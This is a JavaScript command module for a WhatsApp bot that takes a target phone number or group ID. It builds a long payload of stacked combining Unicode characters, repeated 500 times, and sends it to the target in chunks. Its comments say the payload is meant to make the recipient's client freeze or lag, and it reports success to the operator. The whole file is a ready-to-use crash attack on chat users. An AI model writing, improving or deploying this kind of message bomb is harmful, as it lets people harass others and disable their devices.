
export default {
  name: "freeze-test-unicode",
  description: "Send freeze Unicode payload to target (does not display locally)",
  async execute(msg, { sock, args }) {
    try {
      let target = args[0];

      if (!target) {
        return sock.sendMessage(msg.key.remoteJid, {
          text: `⚠️ Usage: ?freeze-test-unicode <number/group>\n\nExample:\n?freeze-test-unicode 234XXXXXXXXXX\n?freeze-test-unicode 120XXXXXXX@g.us`
        });
      }

      // Format target
      if (!target.includes("@g.us") && !target.includes("@s.whatsapp.net")) {
        if (target.length < 11) {
          return sock.sendMessage(msg.key.remoteJid, { 
            text: "⚠️ Invalid number. Use format: 234XXXXXXXXXX" 
          });
        }
        target = target + "@s.whatsapp.net";
      }

      console.log(`[INFO] Executing freeze-test-unicode on target: ${target}`);

      // WARNING: Do NOT increase beyond the safe threshold (noted below).
      // Safe: up to 5000 characters total (roughly 100 repeats).
      // Risky/Freeze: > 20000 characters (roughly 400+ repeats).
      const unit = " █Z͑̓̏̑͋ͮ͘͏͟͝ Ⱥ⚡✦O̴̷̸̦͇͇̙̻̺̞̝̙̱͓̐ͦ͆̍̐̽̒̄ͯͯͮͥ̄ͧ̄́̚͢͞Z̴̛̛̛̛̛̛̛̛̛̛̛̛̛̛̛̛̀͌͒̽̍̄͗̋̔̀̀͗̏̏͐̾͛́̓͛̈́̊̽̊͛̓̈́̎̊̓͒̊̀̎̋̍̽͆̑̋͆̋̏͑̈́͑̅̏̆̎͂̓̏̈́͗̐̓̅̓͗̀͋̍̿̀̑̈̈́̆́̇͒̑͌̆̀̋͐̓̀̽̊̔̔̋̏̊̎͗͊̓͛̄͒͛̽͌͋̅̇̆͆̓̎̓͒̆̋̑͛͋͛̽̄̀̔̀͊͋̆̽̊͐͒̍̈́̍̆̑̎̽̔̏̈̅̋͗͋͗̑̎͑͗̋̎̓͌́̽̑͑̇͊͑̋͐̏̈́͑̅̍̀̔̅̈́͛̈̍̓͂̓͋͛̽̈͂͌̀̑̎͗͊̓̏́͗̏̍͗͌̿͋͊͂̓͐͒̀̆̿͊͗̈̆̆̓͂̐̆̆͗͋̈́͑̽̈́̓̑̐͐͐̿̍̈́̏̍͌̅̎̑̽͋͌̓̆͊̿̇͆̈́̀͋͛̈́̈́̄̽͐̋͂̍̓͆͋͌͊̈̐̑̽͐̐͗̽̄̽͛͆̑͊̈́̿͗̈́̀͛̈́̇͌͛̽̓̇͗̅͂̈́̔͌͂͐̿̅̍̏̎̇̏̔̀͑̓̋̎̏͋͊̈́̐̄͆̄̏͑͋̐̓͋̑͆͛̓̍̄̈͑̔̑̀̀̎͆̇̅̈́̑͑͂̀̇̎́͛͂̋̐̇̆̐͋̔͂͌͐̈̑̓͋̑͋͆͌͂̈́͐͑̋͊͑͂͑̓͌͋͛͂͆̓̋̇͐̀͊̈́̅̓̇̔̐͊͂̎͛̔̑̈́̈́̀̓̓̀͛̋̅́͂́̔͛͌̋̿͗̿̎̇́̏̇̓̀͆̑̅̏̓̿̏̈́͆̓̎͊͊͆̋͛͑͆̔͂͑̎̏͛̏̀͋͊͆͘̕̕̕̚̚̕͘͘̚̚̚͘͘̚͘͘̕͘͘̚̕̕̕͘̚̚͘͘̚̕͘̚̕̕͘͘̚̚̚̚̚̕͘̕͘͘͘͘̚̕̚̚̕̕͘̚̕͘͘̕̚͘̕̚̚͠͝͝͝͠͝͝͝͠͝͝͝͝͝͝͝͝͝͝͠͝͝͠͝͝͠͝͠͝͝͝͝͝͝͠͠͝͝✧✶✹☯☢☣☠☮⚔🜚";

      const safeRepeat = 50; // very safe
      const maxRepeat = 500; // reduced for better delivery 
      const dangerRepeat = 400; // around here, terminals may freeze

      let output = "";

      // Build payload by repeating safely
      for (let i = 1; i <= maxRepeat; i++) {
        output += unit;
        
        // Optional: Log progress every 100 iterations
        if (i % 100 === 0) {
          console.log(`[DEBUG] Building payload... ${i}/${maxRepeat} iterations`);
        }
      }

      console.log(`[INFO] Final payload length: ${output.length} characters`);

      // Send the freeze payload in chunks to ensure delivery
      const CHUNK_SIZE = 50000; // Send in smaller chunks
      const chunks = [];
      for (let i = 0; i < output.length; i += CHUNK_SIZE) {
        chunks.push(output.slice(i, i + CHUNK_SIZE));
      }

      // Send each chunk with a small delay
      for (let i = 0; i < chunks.length; i++) {
        await sock.sendMessage(target, { text: chunks[i] });
        if (i < chunks.length - 1) {
          await new Promise(resolve => setTimeout(resolve, 100)); // 100ms delay between chunks
        }
      }

      await sock.sendMessage(msg.key.remoteJid, {
        text: `✅ Freeze Unicode payload sent to ${target}!\n📊 Payload size: ${output.length} characters\n⚠️ Target may experience freezing/lag`
      });

    } catch (error) {
      console.error(`[ERROR] Freeze-test-unicode command failed:`, error);
      await sock.sendMessage(msg.key.remoteJid, {
        text: "❌ Failed to send freeze payload: " + error.message
      });
    }
  }
};
